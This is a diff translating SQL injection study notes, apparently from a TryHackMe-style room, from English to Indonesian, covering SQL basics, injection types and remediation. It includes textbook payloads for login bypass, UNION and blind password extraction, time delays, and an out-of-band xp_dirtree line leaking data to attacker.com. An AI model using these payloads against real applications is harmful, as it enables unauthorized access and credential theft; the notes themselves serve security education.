@@ -8,39 +8,39 @@
 
 ## Task 1: Brief
 
-**SQL Injection (SQLi)** is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve, such as data belonging to other users, or any other data that the application itself can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang untuk mengganggu query yang dibuat aplikasi ke databasenya. Hal ini memungkinkan penyerang untuk melihat data yang biasanya tidak bisa mereka ambil, seperti data milik pengguna lain, atau data apa pun yang dapat diakses oleh aplikasi itu sendiri. Dalam banyak kasus, penyerang dapat memodifikasi atau menghapus data ini, menyebabkan perubahan permanen pada konten atau perilaku aplikasi.
 
 ---
 
 ## Task 2: What is a Database?
 
-A **database** is a structured collection of data.
-*   **DBMS (Database Management System):** Software used to manage databases (e.g., MySQL, PostgreSQL, Microsoft SQL Server).
-*   **Relational Database (RDBMS):** Stores data in tables with rows and columns. Uses SQL.
-    *   Examples: MySQL, PostgreSQL, MSSQL, SQLite.
-*   **Non-Relational Database (NoSQL):** Stores data in other formats (documents, key-value pairs).
-    *   Examples: MongoDB, Redis.
+**Database** adalah kumpulan data yang terstruktur.
+*   **DBMS (Database Management System):** Perangkat lunak yang digunakan untuk mengelola database (misalnya, MySQL, PostgreSQL, Microsoft SQL Server).
+*   **Relational Database (RDBMS):** Menyimpan data dalam tabel dengan baris dan kolom. Menggunakan SQL.
+    *   Contoh: MySQL, PostgreSQL, MSSQL, SQLite.
+*   **Non-Relational Database (NoSQL):** Menyimpan data dalam format lain (dokumen, key-value pair).
+    *   Contoh: MongoDB, Redis.
 
 ---
 
 ## Task 3: What is SQL?
 
-**SQL (Structured Query Language)** is the standard language for dealing with Relational Databases.
+**SQL (Structured Query Language)** adalah bahasa standar untuk berinteraksi dengan Relational Database.
 
-**Basic Commands:**
-1.  **SELECT:** Retrieve data.
+**Perintah Dasar:**
+1.  **SELECT:** Mengambil data.
     ```sql
     SELECT * FROM users WHERE username = 'admin';
     ```
-2.  **INSERT:** Add new data.
+2.  **INSERT:** Menambahkan data baru.
     ```sql
     INSERT INTO users (username, password) VALUES ('dimm', '12345');
     ```
-3.  **UPDATE:** Modify existing data.
+3.  **UPDATE:** Mengubah data yang sudah ada.
     ```sql
     UPDATE users SET password = 'newpass' WHERE username = 'dimm';
     ```
-4.  **DELETE:** Remove data.
+4.  **DELETE:** Menghapus data.
     ```sql
     DELETE FROM users WHERE username = 'dimm';
     ```
@@ -49,61 +49,61 @@ A **database** is a structured collection of data.
 
 ## Task 4: What is SQL Injection?
 
-SQL Injection occurs when untrusted user input is dynamically concatenated directly into a database query without proper sanitization.
+SQL Injection terjadi ketika input pengguna yang tidak dipercaya digabungkan secara dinamis langsung ke dalam query database tanpa sanitasi yang tepat.
 
-**Example Vulnerability:**
+**Contoh Kerentanan:**
 ```php
 $username = $_POST['username'];
 $query = "SELECT * FROM users WHERE username = '" . $username . "'";
 ```
-If input is `' OR 1=1 --`:
+Jika inputnya adalah `' OR 1=1 --`:
 ```sql
 SELECT * FROM users WHERE username = '' OR 1=1 --'
 ```
-*   `'`: Closes the data field.
-*   `OR 1=1`: Always True condition.
-*   `--`: Comments out the rest of the query.
+*   `'`: Menutup field data.
+*   `OR 1=1`: Kondisi yang Selalu Benar (Always True).
+*   `--`: Mengomentari (mematikan) sisa query.
 
 ---
 
 ## Task 5: In-Band SQLi
 
-**In-Band SQLi** is when the attacker uses the same communication channel to analyze the results.
+**In-Band SQLi** adalah ketika penyerang menggunakan saluran komunikasi yang sama untuk meluncurkan serangan dan mengumpulkan hasilnya.
 
 1.  **Error-Based SQLi:**
-    *   Relies on error messages thrown by the database server to obtain information about the database structure.
-    *   Example: Adding `'` causes a syntax error, revealing the backend DB type.
+    *   Mengandalkan pesan error yang dikeluarkan oleh server database untuk mendapatkan informasi tentang struktur database.
+    *   Contoh: Menambahkan `'` menyebabkan syntax error, yang bisa mengungkap tipe DB di backend.
 
 2.  **Union-Based SQLi:**
-    *   Uses the `UNION` operator to combine the results of two or more SELECT statements into a single result set.
-    *   **Requirement:** Same number of columns and compatible data types.
-    *   Example: `' UNION SELECT username, password FROM users --`
+    *   Menggunakan operator `UNION` untuk menggabungkan hasil dari dua atau lebih statement SELECT menjadi satu hasil.
+    *   **Syarat:** Jumlah kolom harus sama dan tipe datanya kompatibel.
+    *   Contoh: `' UNION SELECT username, password FROM users --`
 
 ---
 
 ## Task 6: Blind SQLi - Authentication Bypass
 
-**Blind SQLi:** The application does not return the results of the SQL query directly.
+**Blind SQLi:** Aplikasi tidak mengembalikan hasil query SQL secara langsung.
 **Authentication Bypass:**
-*   Targeting login forms to log in without a password.
-*   Payload: `' OR 1=1 --` or `admin' --` or `' OR 1=1 LIMIT 1 --`
-*   Goal: Make the query return at least one row (the admin user) so the application thinks the login is successful.
+*   Menargetkan formulir login untuk masuk tanpa password.
+*   Payload: `' OR 1=1 --` atau `admin' --` atau `' OR 1=1 LIMIT 1 --`
+*   Tujuan: Membuat query mengembalikan setidaknya satu baris (user admin) sehingga aplikasi mengira login berhasil.
 
 ---
 
 ## Task 7: Blind SQLi - Boolean Based
 
-**Concept:**
-*   The application returns a different response (page content, HTTP status code) depending on whether the query returns TRUE or FALSE.
-*   We can ask Yes/No questions to the database to extract data character by character.
+**Konsep:**
+*   Aplikasi memberikan respons yang berbeda (konten halaman, kode status HTTP) tergantung apakah query bernilai TRUE atau FALSE.
+*   Kita bisa mengajukan pertanyaan Ya/Tidak ke database untuk mengekstrak data karakter demi karakter.
 
-**Example:**
-Check if the username is 'admin':
+**Contoh:**
+Cek apakah username adalah 'admin':
 ```sql
-admin' AND 1=1 -- (True - Page loads normally)
-admin' AND 1=0 -- (False - Page missing content/404)
+admin' AND 1=1 -- (True - Halaman memuat normal)
+admin' AND 1=0 -- (False - Halaman hilang konten/404)
 ```
-Check first letter of password:
+Cek huruf pertama password:
 ```sql
 admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
 ```
@@ -112,17 +112,17 @@ admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) 
 
 ## Task 8: Blind SQLi - Time Based
 
-**Concept:**
-*   Used when the application provides NO visible difference in response (no errors, no content changes).
-*   We inject a **Time Delay** (sleep) command. If the query executes successfully (TRUE), the server waits for X seconds.
+**Konsep:**
+*   Digunakan ketika aplikasi TIDAK memberikan perbedaan respons yang terlihat (tidak ada error, tidak ada perubahan konten).
+*   Kita menyuntikkan perintah **Time Delay** (tidur). Jika query dieksekusi berhasil (TRUE), server akan menunggu selama X detik.
 
 **Payloads:**
 *   **MySQL:** `SLEEP(5)`
 *   **PostgreSQL:** `pg_sleep(5)`
 *   **MSSQL:** `WAITFOR DELAY '0:0:5'`
 
-**Example:**
-If the database version starts with '5', sleep for 5 seconds:
+**Contoh:**
+Jika versi database diawali dengan angka '5', tidur selama 5 detik:
 ```sql
 ' AND IF(SUBSTRING(VERSION(),1,1)='5', SLEEP(5), 0) --
 ```
@@ -131,25 +131,25 @@ If the database version starts with '5', sleep for 5 seconds:
 
 ## Task 9: Out-of-Band SQLi
 
-**Concept:**
-*   Used when In-Band and Blind techniques are not possible (e.g., async processing).
-*   Relies on the database server's ability to make DNS or HTTP requests to deliver data to an attacker-controlled server.
+**Konsep:**
+*   Digunakan ketika teknik In-Band dan Blind tidak memungkinkan (misalnya, pemrosesan asinkron).
+*   Mengandalkan kemampuan server database untuk membuat request DNS atau HTTP guna mengirimkan data ke server yang dikontrol penyerang.
 
-**Example (MSSQL with `xp_dirtree`):**
-Requests a file from the attacker's server, leaking data in the subdomain:
+**Contoh (MSSQL dengan `xp_dirtree`):**
+Meminta file dari server penyerang, membocorkan data di subdomain:
 ```sql
 '; exec master..xp_dirtree '\\admin-password.attacker.com\foo' --
 ```
-*   The attacker monitors DNS logs for `admin-password.attacker.com`.
+*   Penyerang memantau log DNS untuk `admin-password.attacker.com`.
 
 ---
 
 ## Task 10: Remediation
 
-**How to Fix:**
+**Cara Memperbaiki:**
 
 1.  **Prepared Statements (Parameterized Queries):**
-    *   The database treats user input as data, not executable code.
+    *   Database memperlakukan input pengguna sebagai data, bukan kode yang dapat dieksekusi.
     *   **PHP (PDO):**
         ```php
         $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
@@ -157,8 +157,8 @@ Requests a file from the attacker's server, leaking data in the subdomain:
         ```
 
 2.  **Input Validation:**
-    *   Deny-list (Block dangerous chars like `'`, `--`) - **Weak**.
-    *   Allow-list (Only allow a specific set of chars, e.g., alphanumeric) - **Strong**.
+    *   Deny-list (Blokir karakter berbahaya seperti `'`, `--`) - **Lemah**.
+    *   Allow-list (Hanya izinkan serangkaian karakter tertentu, misal: alfanumerik) - **Kuat**.
 
 3.  **Principle of Least Privilege:**
-    *   The database user used by the web app should only have permissions necessary for its function (e.g., SELECT/INSERT only, no DROP TABLE or FILE access).
+    *   User database yang digunakan oleh aplikasi web hanya boleh memiliki izin yang diperlukan untuk fungsinya (misal: hanya SELECT/INSERT, tidak boleh DROP TABLE atau akses FILE).
